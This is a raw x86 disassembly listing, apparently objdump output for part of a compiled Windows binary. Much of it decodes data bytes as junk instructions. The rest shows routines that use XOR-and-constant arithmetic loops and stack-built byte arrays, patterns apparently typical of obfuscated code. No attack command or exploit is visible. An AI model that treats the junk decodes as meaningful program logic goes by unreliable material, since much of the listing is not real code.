  415ead:	ror    DWORD PTR [ebx+0x14],1
  415eb0:	jno    0x415ea1
  415eb2:	jle    0x415e38
  415eb4:	and    edx,0xfa958bff
  415eba:	test   DWORD PTR ds:0xcadaa756,esp
  415ec0:	jo     0x415e46
  415ec2:	loop   0x415ee1
  415ec4:	nop
  415ec5:	add    bh,dh
  415ec7:	int3   
  415ec8:	jb     0x415f2b
  415eca:	cld    
  415ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ecc:	jns    0x415ebd
  415ece:	and    edx,eax
  415ed0:	pop    ds
  415ed1:	out    dx,al
  415ed2:	inc    edi
  415ed3:	js     0x415f2a
  415ed5:	xchg   esi,eax
  415ed6:	jb     0x415ee5
  415ed8:	sbb    al,0x46
  415eda:	push   esi
  415edb:	cmp    dl,BYTE PTR [ecx]
  415edd:	rcr    BYTE PTR ds:0xaf4ce2fa,0xc1
  415ee4:	aam    0xe4
  415ee6:	jmp    0x798b:0x8080e7f6
  415eed:	mov    dl,0x75
  415eef:	enter  0x10da,0x4
  415ef3:	imul   edi,DWORD PTR [edx],0x13
  415ef6:	clc    
  415ef7:	std    
  415ef8:	or     al,0x35
  415efa:	aaa    
  415efb:	push   es
  415efc:	repz icebp 
  415efe:	ins    DWORD PTR es:[edi],dx
  415eff:	mov    WORD PTR [esp+esi*4],es
  415f02:	mov    ecx,0x183ef86
  415f07:	imul   esp,DWORD PTR [esi],0x53
  415f0a:	jae    0x415f06
  415f0c:	jmp    0x415f0a
  415f0e:	gs (bad) 
  415f10:	hlt    
  415f11:	adc    DWORD PTR [edx+0x12],eax
  415f14:	xor    DWORD PTR [edi],eax
  415f16:	push   ecx
  415f17:	mov    ebx,0x815f60b7
  415f1c:	pusha  
  415f1d:	scas   eax,DWORD PTR es:[edi]
  415f1e:	aam    0xc
  415f20:	test   BYTE PTR [ecx+ebx*2],dh
  415f23:	nop
  415f24:	cmp    eax,0xb9e17afc
  415f29:	dec    edx
  415f2a:	popa   
  415f2b:	imul   esp,DWORD PTR [ebx+esi*1],0x59c7082f
  415f32:	pop    DWORD PTR [eax-0xeac4cb1]
  415f38:	rcl    DWORD PTR [eax],cl
  415f3a:	push   cs
  415f3b:	es cli 
  415f3d:	xor    BYTE PTR [esi+0x7a768be4],ch
  415f43:	test   DWORD PTR [edi-0x1c78ab3b],ebx
  415f49:	pop    edi
  415f4a:	or     al,0xf7
  415f4c:	imul   edi,ebx,0x67
  415f4f:	in     al,0x6c
  415f51:	mov    ds:0x2e64409d,eax
  415f56:	push   eax
  415f57:	push   ebx
  415f58:	mov    edi,DWORD PTR [edx-0x80]
  415f5b:	rcl    BYTE PTR ds:0x4df8b2c2,cl
  415f61:	rcl    DWORD PTR [eax+0x69],0x6d
  415f65:	enter  0x4485,0x81
  415f69:	inc    ebp
  415f6a:	aaa    
  415f6b:	mov    ch,al
  415f6d:	shr    BYTE PTR [eax+0x4a6224ab],0xc
  415f74:	jmp    0x415f6e
  415f76:	test   BYTE PTR [ecx+esi*1],bh
  415f79:	arpl   cx,di
  415f7b:	icebp  
  415f7c:	push   ebx
  415f7d:	mov    ecx,0x383685aa
  415f82:	inc    eax
  415f83:	loop   0x415fdc
  415f85:	(bad)  
  415f86:	in     eax,dx
  415f87:	popf   
  415f88:	clc    
  415f89:	cmc    
  415f8a:	add    ah,BYTE PTR [ebp-0x29c0d7a6]
  415f90:	and    DWORD PTR [eax+0x4e4f35a3],edx
  415f96:	in     al,dx
  415f97:	adc    DWORD PTR [ecx],0xa1cb5640
  415f9d:	dec    ebp
  415f9e:	aad    0xca
  415fa0:	fs push edi
  415fa2:	shr    BYTE PTR [edx-0x59277925],1
  415fa8:	or     cl,dh
  415faa:	std    
  415fab:	xchg   esp,eax
  415fac:	in     al,0xb8
  415fae:	jns    0x416003
  415fb0:	sahf   
  415fb1:	sbb    al,0xd3
  415fb3:	dec    ecx
  415fb4:	js     0x415ff4
  415fb6:	dec    ebx
  415fb7:	cmp    edx,esp
  415fb9:	xor    dh,BYTE PTR [edx+0x6cb23753]
  415fbf:	aam    0x91
  415fc1:	or     BYTE PTR [esi],dl
  415fc3:	xor    DWORD PTR [edx],ebx
  415fc5:	or     ecx,edx
  415fc7:	lock push 0x7e
  415fca:	xchg   ebp,eax
  415fcb:	enter  0x60cc,0x74
  415fcf:	add    ebx,DWORD PTR [ebx-0x3ac323f2]
  415fd5:	inc    ebp
  415fd6:	mov    dh,0xf4
  415fd8:	cwde   
  415fd9:	mov    ?,WORD PTR [eax+0x70]
  415fdc:	mov    ah,0x96
  415fde:	shl    DWORD PTR [edx+0x2faf559],1
  415fe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fe5:	mov    dl,0xb
  415fe7:	push   cs
  415fe8:	adc    ah,BYTE PTR [ebx-0x24]
  415feb:	test   eax,0x2ff38b0b
  415ff0:	cmp    edi,DWORD PTR [edx+0xf8751e6]
  415ff6:	xor    esi,eax
  415ff8:	js     0x416043
  415ffa:	push   cs
  415ffb:	mov    esi,0xdfd37282
  416000:	add    BYTE PTR [esp+ebp*8+0x29],0x10
  416005:	test   ch,al
  416007:	fistp  WORD PTR [ebx]
  416009:	push   0x6d8a4bf1
  41600e:	in     al,0x2c
  416010:	and    cl,al
  416012:	test   DWORD PTR [edx+edx*1],ebx
  416015:	jo     0x416031
  416017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416018:	add    eax,0x2b1b63b0
  41601d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41601e:	scas   eax,DWORD PTR es:[edi]
  41601f:	int    0xc5
  416021:	out    0x74,eax
  416023:	add    edx,edi
  416025:	and    al,0x81
  416027:	dec    ebx
  416028:	shl    DWORD PTR [edx+0x63],1
  41602b:	cwde   
  41602c:	jnp    0x4160ad
  41602e:	push   ebp
  41602f:	lea    edi,[esi-0x59]
  416032:	cmp    ebx,edx
  416034:	mov    eax,0xf99f9bf7
  416039:	mov    al,0x16
  41603b:	or     DWORD PTR [ebp-0x76],esp
  41603e:	fs ret 0x604e
  416042:	cmc    
  416043:	cmc    
  416044:	push   esi
  416045:	addr16 mov ebp,edx
  416048:	push   esi
  416049:	adc    ah,0x5e
  41604c:	push   ebp
  41604d:	adc    al,cl
  41604f:	icebp  
  416050:	cwde   
  416051:	retf   
  416052:	stc    
  416053:	cld    
  416054:	and    bh,ah
  416056:	mov    esp,DWORD PTR [esi]
  416058:	in     al,0xcd
  41605a:	das    
  41605b:	pushf  
  41605c:	(bad)  
  41605d:	(bad)  
  41605e:	scas   al,BYTE PTR es:[edi]
  41605f:	dec    ebx
  416060:	out    dx,eax
  416061:	xchg   ecx,eax
  416062:	cld    
  416063:	dec    ecx
  416064:	call   0xdcd:0x60ece290
  41606b:	push   ebx
  41606c:	and    DWORD PTR [ebp+ebp*2+0x47b96fc5],ebp
  416073:	sbb    al,0x1a
  416075:	mov    edi,DWORD PTR [eax+0xf]
  416078:	imul   ebx,ebp,0xffffffab
  41607b:	jns    0x4160c8
  41607d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41607e:	cmp    al,0xf4
  416080:	mov    esp,esi
  416082:	pop    esp
  416083:	stos   BYTE PTR es:[edi],al
  416084:	add    al,0xae
  416086:	arpl   WORD PTR [esi+0x63],cx
  416089:	sbb    al,0x2e
  41608b:	xlat   BYTE PTR ds:[ebx]
  41608c:	xlat   BYTE PTR ds:[ebx]
  41608d:	rcl    cl,0xd2
  416090:	out    dx,eax
  416091:	mov    dh,0x1b
  416093:	push   edx
  416094:	cmp    eax,0xd340acb2
  416099:	adc    DWORD PTR [ebp+0x20],esp
  41609c:	xchg   esp,eax
  41609d:	pusha  
  41609e:	pop    edi
  41609f:	scas   eax,DWORD PTR es:[edi]
  4160a0:	fs ins DWORD PTR es:[edi],dx
  4160a2:	(bad)  
  4160a4:	std    
  4160a5:	or     eax,0xdab9b47b
  4160aa:	dec    edi
  4160ab:	repnz sbb DWORD PTR [edi+esi*4],edi
  4160af:	push   es
  4160b0:	sub    al,dh
  4160b2:	mov    al,0x83
  4160b4:	js     0x416100
  4160b6:	and    eax,0x5df3e370
  4160bb:	loop   0x4160f3
  4160bd:	and    al,0xf0
  4160bf:	ins    BYTE PTR es:[edi],dx
  4160c0:	repz push ecx
  4160c2:	and    eax,0x8b8b4d27
  4160c7:	ds shr edx,1
  4160ca:	ret    0x63a7
  4160cd:	pop    ebx
  4160ce:	test   DWORD PTR [ebx-0x23],edi
  4160d1:	add    eax,0x4206ff74
  4160d6:	or     cl,ah
  4160d8:	push   es
  4160d9:	cmp    DWORD PTR [esi],0xffffffb1
  4160dc:	xchg   edi,eax
  4160dd:	cmp    ebx,edi
  4160df:	jae    0x416061
  4160e1:	cmp    eax,0xe49bff45
  4160e6:	retf   0x4f08
  4160e9:	sub    al,0xf9
  4160eb:	mov    ch,BYTE PTR [eax]
  4160ed:	(bad)  
  4160ee:	mov    WORD PTR [eax+eiz*8-0x6c69f9],fs
  4160f5:	and    dh,BYTE PTR [ebp+0x71]
  4160f8:	(bad)  
  4160f9:	es dec eax
  4160fb:	enter  0x6d33,0x35
  4160ff:	jecxz  0x41611d
  416101:	pop    esi
  416102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416103:	cli    
  416104:	mov    dl,0x5b
  416106:	lock ss sbb eax,0x44bbe4fb
  41610d:	scas   al,BYTE PTR es:[edi]
  41610e:	lahf   
  41610f:	or     eax,0x46b04950
  416114:	in     al,dx
  416115:	retf   0x9f8a
  416118:	stc    
  416119:	and    DWORD PTR [edi-0x7c1b589f],0x65c7f016
  416123:	jae    0x416169
  416125:	je     0x416121
  416127:	xchg   DWORD PTR [ebp+0x12],ecx
  41612a:	adc    eax,0xc9e60c52
  41612f:	sub    ah,dh
  416131:	cs xor eax,0x7725f110
  416137:	out    0x10,al
  416139:	push   cs
  41613a:	inc    ecx
  41613b:	out    0x2,al
  41613d:	mov    ah,0xec
  41613f:	push   ebp
  416140:	jmp    0x2f6c:0x729e6537
  416147:	pop    edx
  416148:	cmp    al,0x1d
  41614a:	pop    edx
  41614b:	shl    DWORD PTR [edx+0x7c],cl
  41614e:	inc    esp
  41614f:	and    al,0xae
  416151:	sbb    edx,DWORD PTR [ecx]
  416153:	std    
  416154:	sbb    esi,DWORD PTR [esi+0xd12efab]
  41615a:	loop   0x416185
  41615c:	push   0x48
  41615e:	add    edx,0x5e38d2dd
  416164:	ins    BYTE PTR es:[edi],dx
  416165:	or     DWORD PTR [ebx+ebp*4+0x5f63749b],ecx
  41616c:	xchg   DWORD PTR [ebx-0x7ceb5d25],esi
  416172:	and    DWORD PTR cs:[edx-0x15],ebp
  416176:	in     eax,dx
  416177:	push   esi
  416178:	lock mov esp,DWORD PTR es:[ecx-0x5c]
  41617d:	dec    esi
  41617e:	shl    edi,0xa4
  416181:	(bad)  
  416182:	push   ss
  416183:	jmp    0x92b9:0xe1807e41
  41618a:	add    DWORD PTR [edx],ebx
  41618c:	jg     0x4161d5
  41618e:	(bad)  
  41618f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416190:	enter  0x8e36,0xb8
  416194:	cwde   
  416195:	push   ds
  416196:	retf   0x5152
  416199:	test   al,0xad
  41619b:	test   eax,0x6fcd18de
  4161a0:	add    bh,ch
  4161a2:	cmp    al,0x9c
  4161a4:	inc    ebp
  4161a5:	jne    0x4161fb
  4161a7:	cmp    DWORD PTR [esi],ebx
  4161a9:	or     al,0x67
  4161ab:	jb     0x416206
  4161ad:	jne    0x416154
  4161af:	daa    
  4161b0:	xchg   ebp,eax
  4161b1:	and    esi,ebx
  4161b3:	ja     0x4161c1
  4161b5:	pop    es
  4161b6:	daa    
  4161b7:	and    eax,DWORD PTR [ebx-0x13b4f7aa]
  4161bd:	imul   eax,ecx,0xc942bbc7
  4161c3:	mov    esp,0x1ed77230
  4161c8:	es push cs
  4161ca:	retf   
  4161cb:	pop    ecx
  4161cc:	(bad)
  4161cf:	push   0x40f5599a
  4161d4:	test   eax,0xb32825d2
  4161d9:	je     0x4161ac
  4161db:	push   eax
  4161dc:	fimul  WORD PTR [esi]
  4161de:	jo     0x4161b8
  4161e0:	neg    bh
  4161e2:	or     al,0x88
  4161e4:	outs   dx,BYTE PTR ds:[esi]
  4161e5:	lods   al,BYTE PTR ds:[esi]
  4161e6:	or     al,ch
  4161e8:	loopne 0x41625d
  4161ea:	xchg   edi,edx
  4161ec:	jo     0x4161da
  4161ee:	sub    DWORD PTR [ebx+edi*2],ecx
  4161f1:	int    0x0
  4161f3:	int    0xa3
  4161f5:	es push ds
  4161f7:	inc    DWORD PTR [ecx+edi*1+0x73]
  4161fb:	add    al,0xb1
  4161fd:	shl    DWORD PTR [edx-0x43435585],0x79
  416204:	fstp   QWORD PTR [edx-0x13c9fa6b]
  41620a:	adc    ebp,DWORD PTR [edx+0x16db8aea]
  416210:	(bad)  
  416211:	dec    esp
  416212:	test   BYTE PTR [ecx],bl
  416214:	push   ds
  416215:	fiadd  DWORD PTR [ebx+0x3abbd1d7]
  41621b:	jp     0x4161bd
  41621d:	cmp    eax,0x15f6251
  416222:	xor    cl,BYTE PTR [ebx-0x71]
  416225:	dec    ebx
  416226:	mov    esp,0x4c47bd89
  41622b:	fild   WORD PTR [ebx+0x1d3bc5f3]
  416231:	jne    0x416285
  416233:	jo     0x41620c
  416235:	mov    bl,0x3a
  416237:	xor    eax,0xaa1656ff
  41623c:	mov    al,0x7a
  41623e:	mov    BYTE PTR [edx+0x3479447d],ch
  416244:	lods   al,BYTE PTR ds:[esi]
  416245:	sub    eax,0xc1785fc7
  41624a:	test   eax,0xf5763d35
  41624f:	imul   ebp,DWORD PTR [edi],0xffffffa6
  416252:	push   esp
  416253:	inc    ecx
  416254:	adc    ch,BYTE PTR [ebx]
  416256:	sti    
  416257:	adc    BYTE PTR [eax],0xe9
  41625a:	sub    DWORD PTR [ecx+0xc],ecx
  41625d:	sub    eax,0x82855cfd
  416262:	jmp    0x41622f
  416264:	inc    ebx
  416265:	mov    cl,0x9
  416267:	jne    0x4161fd
  416269:	add    eax,0x6d39e09e
  41626e:	jbe    0x416216
  416270:	pop    ecx
  416271:	sbb    cl,bh
  416273:	mov    eax,ds:0xa70692d5
  416278:	cmp    dl,BYTE PTR [edi-0xba08706]
  41627e:	mov    ah,0x35
  416280:	sub    ebp,DWORD PTR [eax]
  416282:	stos   BYTE PTR es:[edi],al
  416283:	inc    ecx
  416284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416285:	fsubr  DWORD PTR [ebx-0x4d]
  416288:	mov    al,ds:0xc56fba35
  41628d:	gs pop ebp
  41628f:	adc    ah,ch
  416291:	inc    esi
  416292:	lock les esi,FWORD PTR [ebp+ebp*8-0x18903513]
  41629a:	mov    ebp,0x350a262d
  41629f:	and    dh,BYTE PTR [edi+0x6b3e215d]
  4162a5:	stc    
  4162a6:	or     bh,BYTE PTR [edx+0x2f07634]
  4162ac:	xchg   edx,eax
  4162ad:	mov    ds:0xa3539a53,eax
  4162b2:	mov    ds:0xd40867e6,eax
  4162b7:	jecxz  0x4162f0
  4162b9:	in     al,dx
  4162ba:	loope  0x4162e9
  4162bc:	cld    
  4162bd:	cmc    
  4162be:	mov    ds,WORD PTR [esi+0xb]
  4162c1:	lea    eax,[esi+0x23]
  4162c4:	pop    edi
  4162c5:	push   ecx
  4162c6:	cld    
  4162c7:	xor    esi,DWORD PTR [esi-0x7ff408ac]
  4162cd:	mov    es,edx
  4162cf:	adc    DWORD PTR [ebx+0x19b2b733],0xffffffae
  4162d6:	mov    al,ds:0x2f0e229d
  4162db:	and    ah,BYTE PTR [edx-0x5a]
  4162de:	in     al,dx
  4162df:	jae    0x416341
  4162e1:	xchg   ebx,eax
  4162e2:	outs   dx,BYTE PTR ds:[esi]
  4162e3:	dec    ebp
  4162e4:	fisttp WORD PTR [ebx+0xf]
  4162e7:	sbb    eax,0x4f26ba83
  4162ec:	out    0x5,al
  4162ee:	(bad)  
  4162ef:	(bad)  
  4162f0:	or     al,0xeb
  4162f2:	mov    bh,0xf3
  4162f4:	adc    esp,edx
  4162f6:	jnp    0x4162f3
  4162f8:	mov    esp,0x3ffc0e13
  4162fd:	(bad)  
  4162fe:	imul   ecx
  416300:	mov    ds:0xb6b78b6f,eax
  416305:	loopne 0x416349
  416307:	pop    ss
  416308:	cmp    ebx,esp
  41630a:	arpl   WORD PTR [eax-0x1266c906],si
  416310:	xchg   ecx,eax
  416311:	ds mov bl,0x57
  416314:	fsubr  DWORD PTR [edi+0x5b7263e6]
  41631a:	xchg   ebp,eax
  41631b:	and    eax,0x7fcf24c0
  416320:	arpl   WORD PTR [ebx+0x774080d],ax
  416326:	sub    edx,DWORD PTR [ebx+0x63107104]
  41632c:	pop    edi
  41632d:	xor    BYTE PTR [ebp-0x55],al
  416330:	pop    edx
  416331:	cld    
  416332:	fcmovne st,st(0)
  416334:	push   ss
  416335:	xchg   esi,eax
  416336:	sbb    ch,BYTE PTR [ebp-0x74]
  416339:	stos   BYTE PTR es:[edi],al
  41633a:	jge    0x4162f8
  41633c:	imul   ebx,DWORD PTR [ebx-0x3f],0x5e
  416340:	jbe    0x416380
  416342:	popf   
  416343:	loopne 0x4162ca
  416345:	aaa    
  416346:	lock mov dh,0x7b
  416349:	stos   BYTE PTR es:[edi],al
  41634a:	fistp  WORD PTR [ebp+0x13]
  41634d:	sbb    al,0x32
  41634f:	shl    BYTE PTR [esi-0x59],0x7
  416353:	inc    edi
  416354:	sbb    esp,edi
  416356:	rcl    DWORD PTR es:[ecx-0x5b5e8623],0xf9
  41635e:	and    BYTE PTR [edi+0x32],0x8d
  416362:	xchg   sp,ax
  416364:	out    dx,al
  416365:	add    ebp,ebx
  416367:	push   ebp
  416368:	jmp    0xcbb7:0xc296dc76
  41636f:	xor    al,0x8e
  416371:	sub    ecx,DWORD PTR [edi-0x53]
  416374:	outs   dx,BYTE PTR ds:[esi]
  416375:	dec    edi
  416376:	aam    0xae
  416378:	jmp    0xfc90:0x2934b33a
  41637f:	pop    esp
  416380:	je     0x41635a
  416382:	add    al,BYTE PTR [edx+0x7]
  416385:	mov    DWORD PTR ds:[ecx+0x5f],eax
  416389:	mov    dh,0xc6
  41638b:	repnz inc esi
  41638d:	cmp    DWORD PTR [esi],ecx
  41638f:	xor    al,0xe7
  416391:	mov    WORD PTR [esi+edi*2+0x1e],gs
  416395:	adc    al,0x80
  416397:	in     al,dx
  416398:	(bad)  
  416399:	jmp    0x4163a8
  41639b:	mov    ss,WORD PTR [edi]
  41639d:	das    
  41639e:	repz pusha 
  4163a0:	test   DWORD PTR [esi-0xa64f337],esp
  4163a6:	pushf  
  4163a7:	mov    dl,0xad
  4163a9:	imul   edx,ebp,0xffffffb0
  4163ac:	lea    esp,[edi]
  4163ae:	and    al,0x27
  4163b0:	ret    
  4163b1:	jle    0x416380
  4163b3:	ins    BYTE PTR es:[edi],dx
  4163b4:	jmp    0xbc5d:0x3da2bcb
  4163bb:	mov    DWORD PTR [ebp-0x44],ebx
  4163be:	mov    edx,DWORD PTR [ebp+0x8]
  4163c1:	xor    edx,eax
  4163c3:	add    edx,esi
  4163c5:	jne    0x413f9a
  4163cb:	mov    edx,DWORD PTR [ebp-0x8]
  4163ce:	mov    ebx,DWORD PTR [ebp-0xc]
  4163d1:	xor    edx,eax
  4163d3:	lea    edx,[edx+ebx*1+0x3272e2]
  4163da:	mov    DWORD PTR [ebp-0xc],edx
  4163dd:	mov    edx,DWORD PTR [ebp-0x10]
  4163e0:	xor    edx,eax
  4163e2:	add    edx,esi
  4163e4:	jne    0x40f3d9
  4163ea:	jmp    0x416501
  4163ef:	mov    ecx,DWORD PTR [ebp-0x14]
  4163f2:	mov    DWORD PTR [ebp+0x8],ecx
  4163f5:	jmp    0x41646e
  4163fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4163fd:	mov    edx,DWORD PTR [ebp-0x8]
  416400:	xor    ecx,eax
  416402:	xor    edx,eax
  416404:	sub    ecx,edx
  416406:	sub    ecx,esi
  416408:	xor    ecx,eax
  41640a:	mov    DWORD PTR [ebp+0x8],ecx
  41640d:	mov    ecx,DWORD PTR [ebp+0x8]
  416410:	mov    edx,DWORD PTR [ebp-0x58]
  416413:	add    ecx,0x5708c4
  416419:	imul   ecx,edx
  41641c:	mov    DWORD PTR [ebp-0x58],ecx
  41641f:	mov    ecx,DWORD PTR [ebp+0x8]
  416422:	mov    edx,DWORD PTR [ebp-0x54]
  416425:	add    ecx,0x64f8da
  41642b:	or     ecx,edx
  41642d:	mov    DWORD PTR [ebp-0x54],ecx
  416430:	mov    ecx,DWORD PTR [ebp+0x8]
  416433:	mov    edx,DWORD PTR [ebp-0x50]
  416436:	add    ecx,0x242ebe9
  41643c:	xor    ecx,edx
  41643e:	mov    DWORD PTR [ebp-0x50],ecx
  416441:	mov    ecx,DWORD PTR [ebp+0x8]
  416444:	mov    edx,DWORD PTR [ebp-0x4c]
  416447:	add    ecx,edi
  416449:	and    ecx,edx
  41644b:	mov    DWORD PTR [ebp-0x4c],ecx
  41644e:	mov    ecx,DWORD PTR [ebp+0x8]
  416451:	mov    edx,DWORD PTR [ebp-0x48]
  416454:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41645b:	mov    DWORD PTR [ebp-0x48],ecx
  41645e:	mov    ecx,DWORD PTR [ebp+0x8]
  416461:	mov    edx,0xfa5e15e2
  416466:	sub    edx,ecx
  416468:	add    edx,DWORD PTR [ebp-0x44]
  41646b:	mov    DWORD PTR [ebp-0x44],edx
  41646e:	mov    ecx,DWORD PTR [ebp+0x8]
  416471:	xor    ecx,eax
  416473:	add    ecx,esi
  416475:	jne    0x4163fa
  41647b:	jmp    0x41650d
  416480:	mov    ecx,DWORD PTR [ebp+0x8]
  416483:	mov    edx,DWORD PTR [ebp-0x8]
  416486:	xor    ecx,eax
  416488:	xor    edx,eax
  41648a:	sub    ecx,edx
  41648c:	sub    ecx,esi
  41648e:	xor    ecx,eax
  416490:	mov    DWORD PTR [ebp+0x8],ecx
  416493:	mov    ecx,DWORD PTR [ebp+0x8]
  416496:	mov    edx,DWORD PTR [ebp-0x58]
  416499:	add    ecx,0x5708c4
  41649f:	imul   ecx,edx
  4164a2:	mov    DWORD PTR [ebp-0x58],ecx
  4164a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4164a8:	mov    edx,DWORD PTR [ebp-0x54]
  4164ab:	add    ecx,0x64f8da
  4164b1:	or     ecx,edx
  4164b3:	mov    DWORD PTR [ebp-0x54],ecx
  4164b6:	mov    ecx,DWORD PTR [ebp+0x8]
  4164b9:	mov    edx,DWORD PTR [ebp-0x50]
  4164bc:	add    ecx,0x242ebe9
  4164c2:	xor    ecx,edx
  4164c4:	mov    DWORD PTR [ebp-0x50],ecx
  4164c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4164ca:	mov    edx,DWORD PTR [ebp-0x4c]
  4164cd:	add    ecx,edi
  4164cf:	and    ecx,edx
  4164d1:	mov    DWORD PTR [ebp-0x4c],ecx
  4164d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164d7:	mov    edx,DWORD PTR [ebp-0x48]
  4164da:	lea    ecx,[edx+ecx*1+0x241fc1f]
  4164e1:	mov    DWORD PTR [ebp-0x48],ecx
  4164e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164e7:	mov    edx,0xfa5e15e2
  4164ec:	sub    edx,ecx
  4164ee:	add    edx,DWORD PTR [ebp-0x44]
  4164f1:	mov    DWORD PTR [ebp-0x44],edx
  4164f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164f7:	xor    ecx,eax
  4164f9:	add    ecx,esi
  4164fb:	jne    0x416480
  416501:	mov    ecx,DWORD PTR [ebp-0x8]
  416504:	xor    ecx,eax
  416506:	mov    eax,DWORD PTR [ebp+0x10]
  416509:	add    ecx,esi
  41650b:	mov    DWORD PTR [eax],ecx
  41650d:	pop    edi
  41650e:	pop    esi
  41650f:	pop    ebx
  416510:	leave  
  416511:	ret    0xc
  416514:	add    BYTE PTR [eax+0x43],al
  416517:	add    BYTE PTR [eax+eax*2],al
  41651a:	inc    ebx
  41651b:	add    BYTE PTR [eax],cl
  41651d:	inc    eax
  41651e:	inc    ebx
  41651f:	add    BYTE PTR [eax+eax*2],cl
  416522:	inc    ebx
  416523:	add    BYTE PTR [eax],dl
  416525:	inc    eax
  416526:	inc    ebx
  416527:	add    BYTE PTR [eax+eax*2],dl
  41652a:	inc    ebx
  41652b:	add    BYTE PTR [eax],bl
  41652d:	inc    eax
  41652e:	inc    ebx
  41652f:	add    BYTE PTR [eax+eax*2],bl
  416532:	inc    ebx
  416533:	add    BYTE PTR [eax],ah
  416535:	inc    eax
  416536:	inc    ebx
  416537:	add    BYTE PTR [eax+eax*2],ah
  41653a:	inc    ebx
  41653b:	add    BYTE PTR [eax],ch
  41653d:	inc    eax
  41653e:	inc    ebx
  41653f:	add    BYTE PTR [eax],al
  416541:	pusha  
  416542:	inc    ebx
  416543:	add    BYTE PTR [eax+eiz*2],al
  416546:	inc    ebx
  416547:	add    BYTE PTR [eax],cl
  416549:	pusha  
  41654a:	inc    ebx
  41654b:	add    BYTE PTR [eax+eiz*2],cl
  41654e:	inc    ebx
  41654f:	add    BYTE PTR [eax],dl
  416551:	pusha  
  416552:	inc    ebx
  416553:	add    BYTE PTR [eax+eiz*2],dl
  416556:	inc    ebx
  416557:	add    BYTE PTR [eax],bl
  416559:	pusha  
  41655a:	inc    ebx
  41655b:	add    BYTE PTR [eax+eiz*2],bl
  41655e:	inc    ebx
  41655f:	add    BYTE PTR [eax],al
  416561:	push   eax
  416562:	inc    ebx
  416563:	add    BYTE PTR [eax+edx*2],al
  416566:	inc    ebx
  416567:	add    BYTE PTR [eax],cl
  416569:	push   eax
  41656a:	inc    ebx
  41656b:	add    BYTE PTR [eax+edx*2],cl
  41656e:	inc    ebx
  41656f:	add    BYTE PTR [eax],dl
  416571:	push   eax
  416572:	inc    ebx
  416573:	add    BYTE PTR [eax+edx*2],dl
  416576:	inc    ebx
  416577:	add    BYTE PTR [eax],bl
  416579:	push   eax
  41657a:	inc    ebx
  41657b:	add    BYTE PTR [eax+edx*2],bl
  41657e:	inc    ebx
  41657f:	add    BYTE PTR [eax],al
  416581:	add    BYTE PTR [eax],al
  416583:	add    al,dl
  416585:	into   
  416586:	xor    BYTE PTR [ebp+0x0],cl
  416589:	add    BYTE PTR [eax],al
  41658b:	add    BYTE PTR [edx],al
  41658d:	add    BYTE PTR [eax],al
  41658f:	add    BYTE PTR ds:0xc0000000,bh
  416595:	add    DWORD PTR gs:[eax],eax
  416598:	rcr    BYTE PTR [ecx+0x1],0x0
  41659c:	add    BYTE PTR [eax+0x43],dh
  41659f:	add    BYTE PTR [eax+esi*2],al
  4165a2:	inc    ebx
  4165a3:	add    BYTE PTR [eax],cl
  4165a5:	jo     0x4165ea
  4165a7:	add    BYTE PTR [eax+esi*2],cl
  4165aa:	inc    ebx
  4165ab:	add    BYTE PTR [eax],dl
  4165ad:	jo     0x4165f2
  4165af:	add    BYTE PTR [eax+esi*2],dl
  4165b2:	inc    ebx
  4165b3:	add    BYTE PTR [eax],bl
  4165b5:	jo     0x4165fa
  4165b7:	add    BYTE PTR [eax+esi*2],bl
  4165ba:	inc    ebx
  4165bb:	add    BYTE PTR [eax],al
  4165bd:	add    BYTE PTR [eax],al
  4165bf:	add    BYTE PTR [edx+0x53],dl
  4165c2:	inc    esp
  4165c3:	push   ebx
  4165c4:	sbb    al,0xe7
  4165c6:	mov    edi,0x23c6c514
  4165cb:	dec    eax
  4165cc:	lahf   
  4165cd:	ss (bad) 
  4165cf:	aaa    
  4165d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165d1:	add    al,0x79
  4165d3:	in     eax,0x1
  4165d5:	add    BYTE PTR [eax],al
  4165d7:	add    BYTE PTR [ebx+0x3a],al
  4165da:	pop    esp
  4165db:	inc    ebx
  4165dc:	jne    0x416650
  4165de:	jb     0x416645
  4165e0:	outs   dx,BYTE PTR ds:[esi]
  4165e1:	je     0x416627
  4165e3:	popa   
  4165e4:	je     0x416647
  4165e6:	pop    esp
  4165e7:	dec    ebp
  4165e8:	outs   dx,DWORD PTR ds:[esi]
  4165e9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  4165f1:	ins    BYTE PTR es:[edi],dx
  4165f2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4165f9:	dec    esi
  4165fa:	gs ja  0x4165fd
  4165fd:	mov    edx,DWORD PTR [ebp-0x14]
  416600:	sub    esp,0x108
  416606:	push   ebx
  416607:	mov    eax,ebx
  416609:	xchg   ecx,eax
  41660a:	mov    eax,DWORD PTR [ebp+0x8]
  41660d:	cmp    eax,0xf89c8585
  416612:	jne    0x416a95
  416618:	mov    eax,DWORD PTR [ebp+0xc]
  41661b:	cmp    eax,0xf89c8584
  416620:	jne    0x416a95
  416626:	mov    eax,DWORD PTR [ebp+0x24]
  416629:	mov    DWORD PTR [ebp-0x4],eax
  41662c:	mov    BYTE PTR [ebp-0x18],0x1b
  416630:	mov    BYTE PTR [ebp-0x17],0x18
  416634:	mov    BYTE PTR [ebp-0x16],0x5
  416638:	mov    BYTE PTR [ebp-0x15],0x4f
  41663c:	mov    BYTE PTR [ebp-0x14],0x4e
  416640:	mov    BYTE PTR [ebp-0x13],0x7c
  416644:	mov    BYTE PTR [ebp-0x20],0x9
  416648:	mov    BYTE PTR [ebp-0x1f],0xf
  41664c:	mov    BYTE PTR [ebp-0x1e],0x19
  416650:	mov    BYTE PTR [ebp-0x1d],0xe
  416654:	mov    BYTE PTR [ebp-0x1c],0x4f
